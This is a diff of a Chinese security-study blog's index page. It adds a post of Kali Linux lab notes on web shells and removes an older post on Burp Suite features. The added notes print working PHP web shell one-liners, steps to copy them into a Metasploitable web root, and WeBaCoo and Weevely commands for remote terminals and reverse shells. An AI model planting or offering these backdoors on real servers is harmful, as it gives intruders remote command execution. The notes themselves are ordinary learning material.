@@ -240,6 +240,288 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/21/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E5%9B%9B)%EF%BC%9AWebShell/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/01/21/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E5%9B%9B)%EF%BC%9AWebShell/" itemprop="url">Kali Linux笔记(五十四)：WebShell</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-21T20:40:16+08:00">
+                2020-01-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  706 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  3 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-WEBSHELL–浏览器"><a href="#1-WEBSHELL–浏览器" class="headerlink" title="1. WEBSHELL–浏览器"></a>1. WEBSHELL–浏览器</h4><ul>
+<li>Shell<ul>
+<li>ssh登陆到metasploitable</li>
+<li><strong><code>🔺命令：vi a.php</code></strong></li>
+<li><code>&lt;?php echo shell_exec($_GET[&#39;cmd&#39;]);?&gt;</code></li>
+<li><strong><code>🔺命令：cp a.php /var/www</code></strong></li>
+<li>浏览器访问a.php</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-WEBSHELL–中国菜刀-▲-2020-1-21暂未使用"><a href="#2-WEBSHELL–中国菜刀-▲-2020-1-21暂未使用" class="headerlink" title="2. WEBSHELL–中国菜刀 ▲ 2020.1.21暂未使用"></a>2. WEBSHELL–中国菜刀 ▲ 2020.1.21暂未使用</h4><ul>
+<li>中国菜刀：<a href="http://www.maicaidao.co/（使用unicode编码）" target="_blank" rel="noopener">http://www.maicaidao.co/（使用unicode编码）</a><ul>
+<li>将代码新建到靶机上caidao.php</li>
+<li><code>&lt;?php @eval(_POST[&#39;chopper&#39;]);?&gt;</code></li>
+<li><strong><code>🔺命令：cp caidao.php /var/www</code></strong></li>
+<li>菜刀服务端添加caidao.php的URL，进行配置，输入密码，执行</li>
+</ul>
+</li>
+<li>WebShell可能被IDS、AV、WAF、扫描器软件发现查杀</li>
+</ul>
+<h4 id="3-WEBSHELL–WeBaCoo（PHP）"><a href="#3-WEBSHELL–WeBaCoo（PHP）" class="headerlink" title="3. WEBSHELL–WeBaCoo（PHP）"></a>3. WEBSHELL–WeBaCoo（PHP）</h4><ul>
+<li>WeBaCoo（Web Backdoor Cookie）<ul>
+<li>类终端的shell</li>
+<li>编码通信内容通过cookie头传输，隐蔽性较强</li>
+<li>cm：base64编码的命令</li>
+<li>cn：服务器用于数据的cookie头的名（默认值）</li>
+<li>cp：返回信息定界符（变化的定界符）</li>
+<li>生成服务端</li>
+</ul>
+</li>
+<li>生成服务端<ul>
+<li><strong><code>🔺命令：webacoo -g -o webacoo.php</code></strong></li>
+</ul>
+</li>
+<li>拷贝webacoo.php到服务器端<ul>
+<li><strong><code>🔺命令：scp webacoo.php msfadmin@192.168.1.115:/home/msfadmin</code></strong></li>
+<li>ssh登陆到metasploitable</li>
+<li><strong><code>🔺命令：cp webacoo.php /var/www</code></strong></li>
+</ul>
+</li>
+<li>客户端连接<ul>
+<li><strong><code>🔺命令：webacoo -t -u &quot;http://1.1.1.1/webacoo.php&quot;</code></strong></li>
+</ul>
+</li>
+<li>连接成功会出现命令提示符</li>
+<li>抓包查看cookie</li>
+<li>其他参数<ul>
+<li>-g 生成服务器端代码</li>
+<li>-f 添加执行php操作系统函数</li>
+<li>-r 返回不进行混淆的代码</li>
+<li>-t 远程建立terminal</li>
+<li>-u webacoo URL</li>
+<li>-e 单命令执行模式</li>
+<li>-m HTTP通信方式（默认为Get）</li>
+<li>-c 指定Cookie名字</li>
+<li>-d 定界符</li>
+<li>-a HTTP的user-agent</li>
+<li>-p 代理服务</li>
+<li>-l 记录日志</li>
+<li>update 升级版本</li>
+</ul>
+</li>
+</ul>
+<h4 id="4-WEBSHELL–Weevely（PHP）"><a href="#4-WEBSHELL–Weevely（PHP）" class="headerlink" title="4. WEBSHELL–Weevely（PHP）"></a>4. WEBSHELL–Weevely（PHP）</h4><ul>
+<li>隐藏的类终端PHP Webshell</li>
+<li>30多个管理模块<ul>
+<li>执行系统命令、测试文件系统</li>
+<li>检查服务器常见配置错误</li>
+<li>创建正向、反向TCP Shell连接</li>
+<li>通过目标计算机代理HTTP流量</li>
+<li>从目标计算机运行端口扫描，渗透内网</li>
+</ul>
+</li>
+<li>支持连接密码</li>
+<li>Kali缺少库 ▲ 2020.1.21已支持该库<ul>
+<li><a href="https://pypi.python.org/pypi/PySocks/" target="_blank" rel="noopener">https://pypi.python.org/pypi/PySocks/</a></li>
+<li><strong><code>🔺命令：./setup.py install</code></strong></li>
+</ul>
+</li>
+<li>生成服务端<ul>
+<li><strong><code>🔺命令：weevely generate &lt;password&gt; wee.php</code></strong> </li>
+<li>/usr/share/weevely/wee.php ▲ 2020.1.21生成程序在终端所在位置</li>
+</ul>
+</li>
+<li>拷贝wee.php到服务器端<ul>
+<li><strong><code>🔺命令：scp wee.php msfadmin@192.168.1.115:/home/msfadmin</code></strong></li>
+<li><strong><code>🔺命令：cp wee.php /var/www</code></strong></li>
+</ul>
+</li>
+<li>客户端连接服务器<ul>
+<li><strong><code>🔺命令：weevely http://1.1.1.1/wee.php &lt;password&gt;</code></strong></li>
+</ul>
+</li>
+<li>抓包查看HTTP头（过滤：tcp.stream eq 5）</li>
+<li>▲ 通过Referer、Cookie、body进行传输，解码可用Base64解码</li>
+<li>help（查看模块）<ul>
+<li>audit_sgidsgid（SUID+SGID）</li>
+<li>audit_filesystem（查找文件设置权限）</li>
+<li>audit_phpconf（审计php的配置信息）</li>
+<li>system_info（操作系统配置）</li>
+<li>backdoor_tcp（本地监听一个shell在TCP端口上）</li>
+<li>backdoor_reversetcp（本地监听反弹一个shell）</li>
+<li>bruteforce_sql（SQL注入的暴力破解）</li>
+<li>net_proxy（把靶机变成代理服务器，但代理IP端口都设置在攻击者上）</li>
+<li>net_phpproxy（php代理，需要安装一个php代理在靶机上）</li>
+<li>net_scan IP:端口（把靶机作为扫描器）</li>
+</ul>
+</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/21/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%B8%89)%EF%BC%9ACSRF/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2940,532 +3222,6 @@ Host：123
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E4%B8%89)%EF%BC%9ABurpsuite/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/01/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E4%B8%89)%EF%BC%9ABurpsuite/" itemprop="url">Kali Linux笔记(四十三)：Burpsuite</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-03T18:50:46+08:00">
-                2020-01-03
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  2.4k 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  10 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-Burpsuite"><a href="#1-Burpsuite" class="headerlink" title="1. Burpsuite"></a>1. Burpsuite</h4><ul>
-<li>Web安全工具中的瑞士军刀</li>
-<li>统一的集成工具发现全部现代WEB安全漏洞</li>
-<li>PortSwigger公司开发（基于JAVA）<ul>
-<li>Burp Free</li>
-<li>Burp Professional</li>
-<li><a href="http://www.portswigger.net" target="_blank" rel="noopener">http://www.portswigger.net</a></li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>▲ Free版本和Professional版本之间的区别是，Free版本没有主动扫描功能</code></pre></blockquote>
-<ul>
-<li>所有的工具共享一个能处理并显示HTTP消息的可扩展框架，模块之间无缝交换信息</li>
-<li>字体（首次启动修改字体）<ul>
-<li>Options → Display → HTTP Message Dispaly → 中文字体</li>
-</ul>
-</li>
-</ul>
-<h4 id="2-Burpsuite-Proxy"><a href="#2-Burpsuite-Proxy" class="headerlink" title="2. Burpsuite Proxy"></a>2. Burpsuite Proxy</h4><ul>
-<li>Options<ul>
-<li>Proxy Listeners（默认监听8080）</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>⭐Banding 监听的端口，可以修改IP作为代理转发   
-⭐Request handing 转发到其他主机，非真正目的地址（Redirect to host/port） 
-▲ Invisible proxy 对于客户端程序不支持代理但走HTTPS协议代理功能的程序。
-1.其原理是欺骗本机的DNS服务器，将所要发送的域名解析成Burpsuite的IP地址，然后通过Burpsuit本机的DNS服务器或者局域网内的解析成对公网的IP地址
-2.但若本机和Burpsuit在同一台机器上，会陷入欺骗，解析本地地址的死循环
-3.需要通过Options → Hostname Resolution去增加解析地址
-▲ Invisible Proxy主机头问题 
-1.When using plain HTTP,a proxy-style request looks like this:
-GET http://example.org/foo.php HTTP/1.1
-Host:example.org
-2.Whereas the corresponding non-proxy-style request looks like this:
-GET:/foo.php HTTP/1.1
-Host:example.org
-不支持代理的Web Application可能多为第二种情况的请求，不包含完整头部的HTTP头部请求，此时可开启环回网卡的Invisible Proxy功能，然后通过Redirect to host/port重定向到需要访问真正的目标地址
-▲ Invisible Proxy多目标域名问题
-可以创建多个环回网卡Lookback，监听多个端口，每个环回网卡都开启Invisible Proxy，然后通过Redirect to host/port重定向到需要访问真正的目标地址
-⭐CA certificate（导入导出）
-1.Export → certificate in DER format
-2.在Proxy情况下，访问http://burp，生成CA certificate</code></pre></blockquote>
-<ul>
-<li>Options<ul>
-<li>Intercept Client Request（默认截断）</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>▲ 默认情况下只有一条规则：File extension
-▲ 请求头发生变化：Automatically uodate Content-Length header when the request is edited</code></pre></blockquote>
-<ul>
-<li>Options<ul>
-<li>Intercept Server Responses（默认不截断）</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>默认情况下只有一条规则：Content type header</code></pre></blockquote>
-<ul>
-<li>Options<ul>
-<li>Intercept WeSockets Messages</li>
-<li>Response Modification</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>▲ 常用的Modification
-Unhide hidden from fields（显示隐藏表单）
-Enable disabled form fields（激活被禁止的表单）
-Remove input field length limits（去除输入限制长度）
-Remove JavaScript from validation（去除JavaScript的验证）
-Remove All JavaScript（去除所有的JavaScript）
-Remove secure flag from cookies（去掉cookies的安全标签）</code></pre></blockquote>
-<ul>
-<li>Options<ul>
-<li>Match and Replace（匹配和替换，Request header match就repalce）</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>▲ 提交数据的自动修改
-Original reequest 原始的请求
-Auto-modified request 修改后的请求</code></pre></blockquote>
-<ul>
-<li>Options<ul>
-<li>SSL Pass Through（加密流量直接通过，不截获代理）</li>
-</ul>
-</li>
-<li>Intercept（截断请求代理，默认不截断返回的流量）<ul>
-<li>Intercept is on（截断代理开启）</li>
-<li>Froward（单步发送信息）</li>
-<li>Drop（丢弃包数据，不发送）</li>
-</ul>
-</li>
-<li>HTTP history（截断代理历史）<ul>
-<li>Request</li>
-<li>Response</li>
-</ul>
-</li>
-<li>Web Socket history（无界面的Web Application，SOCKET长连接） </li>
-</ul>
-<h4 id="3-Burpsuite-Target"><a href="#3-Burpsuite-Target" class="headerlink" title="3. Burpsuite Target"></a>3. Burpsuite Target</h4><ul>
-<li>Site map<ul>
-<li>黑色链接：真正访问的链接/灰色链接：通过爬网爬出来的链接，无进行真正访问</li>
-<li>过滤功能：选择站点 → 右键 → Add to Scope（上方白色横条为过滤功能）</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>▲  过滤：
-过滤在Scope中的内容：Filter by request type → Show only in-scope items
-过滤真正发生请求：Filter by request type → Show only requests items
-过滤有参数的请求:Filter by request type → Show only oarameterised requests
-指定参数进行过滤：Filter by search term → 输入字符串
-过滤网页类型：Filter by MIME type
-过滤访问请求码:Filter by status code
-过滤文件扩展名：Filter by file extension
-过滤高亮显示的网页： 右键高亮选中选项（Highlight） → Filter by abotation → Show only highlighted ietms
-过滤有注释的网页：右键注释选中选项（Add Comment）→ Filter by abotation → Show only commented items</code></pre></blockquote>
-<ul>
-<li>Scope<ul>
-<li>Add to Scope会生成过滤的正则表达式</li>
-<li>Include in Scope（加入Scope）</li>
-<li>Exclude from Scope（排除Scope）</li>
-</ul>
-</li>
-</ul>
-<h4 id="4-Burpsuite-Spider-▲-2020-1-3-新版暂无此扩展"><a href="#4-Burpsuite-Spider-▲-2020-1-3-新版暂无此扩展" class="headerlink" title="4. Burpsuite Spider ▲ 2020.1.3 新版暂无此扩展"></a>4. Burpsuite Spider ▲ 2020.1.3 新版暂无此扩展</h4><ul>
-<li>手动爬网</li>
-<li>自动爬网<ul>
-<li>站点目录 → 右键 → Spider this branch</li>
-</ul>
-</li>
-<li>Control<ul>
-<li>Spider Status（Spider is pause自动爬网暂停/Clear queues清理要爬网队列）</li>
-</ul>
-</li>
-<li>Options<ul>
-<li>Application Login（Prompt for guidance提示）</li>
-<li>Passive Spidering（对手动爬网进行分析）</li>
-<li>Request Headers（请求头格式）</li>
-</ul>
-</li>
-<li>比较不同账号或配置，爬网的内容<ul>
-<li>站点目录 → 右键 → Compare site map</li>
-<li>Use current site map（Site map 1）</li>
-<li>Use all items with resposes/Include in-scope items only</li>
-<li>Load from Burp state file（Site map 2）</li>
-<li>Use all items with resposes/Include in-scope items only</li>
-<li>Request Matching（可以默认）</li>
-<li>Response Comparation（可以默认）</li>
-<li>Sync selection（同步两次选中）</li>
-</ul>
-</li>
-</ul>
-<h4 id="5-Burpsuite-Scanner-▲-2020-1-3-新版暂无此扩展"><a href="#5-Burpsuite-Scanner-▲-2020-1-3-新版暂无此扩展" class="headerlink" title="5. Burpsuite Scanner ▲ 2020.1.3 新版暂无此扩展"></a>5. Burpsuite Scanner ▲ 2020.1.3 新版暂无此扩展</h4><ul>
-<li>主动扫描：站点目录 → 右键 → Actively scan this branch</li>
-<li>Options<ul>
-<li>Attack Insertion Points</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>⭐Place attacks into the following location within requests:
-1.URL parameter values
-2.Body parameter values
-3.Cookies parameter values
-4.parameter name
-5.HTTP headers
-6.AMF string parameter（Adobe Flash脚本注入）
-7.REST-STYLE URL parameters
-⭐Change parameter locations（causes many more scan requests）:
-⭐Skip all tests for these parameters（Add）</code></pre></blockquote>
-<ul>
-<li>Options<ul>
-<li>Active Scanning Engine（主动扫描）</li>
-<li>Active Scanning Optimization（主动扫描选项：Speed（扫描速度）/accuracy（准确性））</li>
-<li>Actvie Scanning Areas（主动扫描类型，默认全选）</li>
-<li>Passive Scanning Areas（被动扫描类型，默认全选）</li>
-</ul>
-</li>
-<li>Scan queue（扫描队列）</li>
-<li>Results（扫描结果）</li>
-</ul>
-<h4 id="6-Burpsuite-Extender"><a href="#6-Burpsuite-Extender" class="headerlink" title="6. Burpsuite Extender"></a>6. Burpsuite Extender</h4><ul>
-<li>BApp Store（商店扩展）</li>
-<li>Entensions（安装的扩展）▲ jython（java访问python的中间组件）</li>
-<li>Options<ul>
-<li>Python Environment/jython Standalone Jar（<a href="http://www.jython.og/downloads.html）" target="_blank" rel="noopener">http://www.jython.og/downloads.html）</a></li>
-<li>cp jython Standalone Jar /root/Desktop</li>
-<li>推荐j2EEScan、CO2（图形化SQLMap）插件</li>
-</ul>
-</li>
-</ul>
-<h4 id="7-Burpsuite-Intruder"><a href="#7-Burpsuite-Intruder" class="headerlink" title="7. Burpsuite Intruder"></a>7. Burpsuite Intruder</h4><ul>
-<li>选取爬取的站点选项Request右键 → Send to Intrude（发送模块）</li>
-<li>Positiors<ul>
-<li>Attcak type</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>⭐Attcak type攻击类型（n比m大）
-1.Sniper：先在第一个变量位置逐一插入，第二个位置不变；再在第二个变量位置逐一插入，第一个变量的位置不变（从指定的字典进行破解，只需要一个字典，总替换次数为m+n次）
-2.Battering ram：在变量的位置上，都放上同样的值，变量上的值是一样的（从指定的字典进行破解，只需要一个字典，总替换次数为m+n次）
-3.Pitchfork：从两个字典中各取出同序号的项目放入到变量的位置，若有一个字典的值结束，则此次破解结束（从指定的字典进行破解，需要两个字典，总替换次数为n次）
-4.Cluster bomb：从第一个字典的第一项开始，尝试第二个字典的所有选项，再从第一个字典的第二项开始，尝试第二个字典的所有选项，以此类推（从指定的字典进行破解，需要两个字典，总替换次数为m*n次）</code></pre></blockquote>
-<ul>
-<li>Positiors<ul>
-<li>打上$$作为变量</li>
-<li>Clear $</li>
-<li>选择变量Add $$</li>
-<li>指定Attcak typ以及字典</li>
-</ul>
-</li>
-<li>Payloads<ul>
-<li>Payload Sets（字典类型）</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>⭐Payload Sets:
-1.Simple list 简单字典
-2.Runtime file 指定字典文件路径
-3.Case modification 大小写的替换
-4.Character blocks 字符块
-5.Number 数字
-6.Datas 日期
-7.Brute force 暴力破解（Character set）
-8.Username generator 用户名生成器（Add fanghong:yuan）
-9.Copy other payload 复制字典文件</code></pre></blockquote>
-<ul>
-<li>Payloads<ul>
-<li>Payload Options【Payload Sets】（选择密码字典文件）</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>⭐Add from list:
-1.Fuzzing-full 常用fuzz字典</code></pre></blockquote>
-<ul>
-<li>Payloads<ul>
-<li>Payload Processing（对Payload进行加工）</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>⭐Add:
-1.Add prefix 添加字典前缀
-2.Add suiffix 添加字典后缀
-3.Match/replace 匹配就替换
-4.Reverse substring 反转字符串
-5.Modify case 修改大小写
-6.Encode 编码
-7.Decode 解码
-8.Hash 哈希</code></pre></blockquote>
-<ul>
-<li>Payloads<ul>
-<li>Payload Encoding（URL-encode these character编码字符）</li>
-</ul>
-</li>
-<li>Options<ul>
-<li>Grap Match（Add Match，默认是Exclude HTTP header，需要去除）</li>
-</ul>
-</li>
-<li>在指定完所有的Intrude选项后，开始Intrude<ul>
-<li>顶部 → Intruder → Start attack</li>
-<li>可选择上方白色横条进行filter/或通过Options中的Grap Match进行匹配</li>
-<li>▲ 基于此项Intruder功能，可以进行页面存在性的Fuzz（指定字典）</li>
-</ul>
-</li>
-</ul>
-<h4 id="8-Burpsuit-Repeater"><a href="#8-Burpsuit-Repeater" class="headerlink" title="8. Burpsuit Repeater"></a>8. Burpsuit Repeater</h4><ul>
-<li>站点目录网页 → 右键 → Send to Repeater</li>
-<li>重放：Request → Go → Response</li>
-<li>更改请求方式：Request/Raw → 右键 → Change request method</li>
-<li>更改body编码：Request/Raw → 右键 → Change body encoding</li>
-<li>转换为curl命令形式：Request/Raw → 右键 → Copy as curl command</li>
-<li>如果为CSRF漏洞存在页面（Request/Raw → 右键）<ul>
-<li>Generate CSRF Poc（生成一份Poc代码文件）</li>
-</ul>
-</li>
-<li>菜单栏 → Reperter<ul>
-<li>Update Content-Length（默认自动调整）</li>
-<li>Unpack gzip/deflate（默认自动解压）</li>
-<li>Follow redirections（重定向）</li>
-<li>Process cookies in redirections（处理Cookies重定向，带取Cookie）</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>⭐Follow redirections:
-1.Never 不跟随重定向（默认）
-2.One-site only 一个站点重定向
-3.In-scope only 一个scope重定向
-4.Always 总是重定向</code></pre></blockquote>
-<h4 id="9-Burpsuit-Sequence"><a href="#9-Burpsuit-Sequence" class="headerlink" title="9. Burpsuit Sequence"></a>9. Burpsuit Sequence</h4><ul>
-<li>删除浏览器的Cookies信息（抓取生成Cookies的过程）</li>
-<li>站点目录网页 → 右键 → Send to Sequence</li>
-<li>Token Location Within Response（令牌选择）<ul>
-<li>如果自动识别：Cookies保存在Cookie中</li>
-<li>如果未自动识别：可通过Custom location进行手动选择序列</li>
-</ul>
-</li>
-<li>Select Live Capture Request<ul>
-<li>Start live caputre（不断请求服务器，请求新生成SessionID进行分析）</li>
-<li>收集SessionID → Analyze now </li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>⭐Analyze（伪随机算法的分析）
-1.Summary → Overall result
-2.Character-level analysis 基于字符层面的分析
-3.Bit-level analysis 基于位层面的分析
-▲ FIPS--美国联邦信息处理标准（Federal Information Processing Standard）</code></pre></blockquote>
-<h4 id="10-Burpsuit-Encode-Decode"><a href="#10-Burpsuit-Encode-Decode" class="headerlink" title="10. Burpsuit Encode/Decode"></a>10. Burpsuit Encode/Decode</h4><ul>
-<li>多层复杂编码，可以绕过过滤机制</li>
-<li>Smart decode（只能解码）</li>
-</ul>
-<h4 id="11-Burpsuit-Compare"><a href="#11-Burpsuit-Compare" class="headerlink" title="11. Burpsuit Compare"></a>11. Burpsuit Compare</h4><ul>
-<li>同之前的Compare</li>
-</ul>
-<h4 id="12-Burpsuit-Options"><a href="#12-Burpsuit-Options" class="headerlink" title="12. Burpsuit Options"></a>12. Burpsuit Options</h4><ul>
-<li>Connections<ul>
-<li>Platform Authentication（表单/Http身份认证等其他认证）</li>
-<li>Upstream Proxy Servers（上游代理服务器）</li>
-<li>SOCKS proxy</li>
-<li>Timeouts（超时时间）</li>
-</ul>
-</li>
-<li>HTTP</li>
-<li>SSL<ul>
-<li>Client SSL Certificates（Web Application需要客户端证书，比如软银）</li>
-<li>Server SSL Certificates（服务器代理，导入证书）</li>
-</ul>
-</li>
-<li>Sessions</li>
-<li>Dispaly</li>
-<li>Misc<ul>
-<li>Logging（记录所有操作过程）</li>
-<li>Scheduled Tasks（定期日期表）</li>
-</ul>
-</li>
-</ul>
-<h4 id="13-Burpsuit-Alerts"><a href="#13-Burpsuit-Alerts" class="headerlink" title="13. Burpsuit Alerts"></a>13. Burpsuit Alerts</h4><h4 id="14-截断代理工具"><a href="#14-截断代理工具" class="headerlink" title="14. 截断代理工具"></a>14. 截断代理工具</h4><ul>
-<li>Paros（最早的截断代理工具）</li>
-<li>Webscrab</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -3520,7 +3276,7 @@ Auto-modified request 修改后的请求</code></pre></blockquote>
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">99</span>
+                  <span class="site-state-item-count">100</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -3627,7 +3383,7 @@ Auto-modified request 修改后的请求</code></pre></blockquote>
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">97k</span>
+    <span title="Site words total count">97.7k</span>
   
 </div>
 
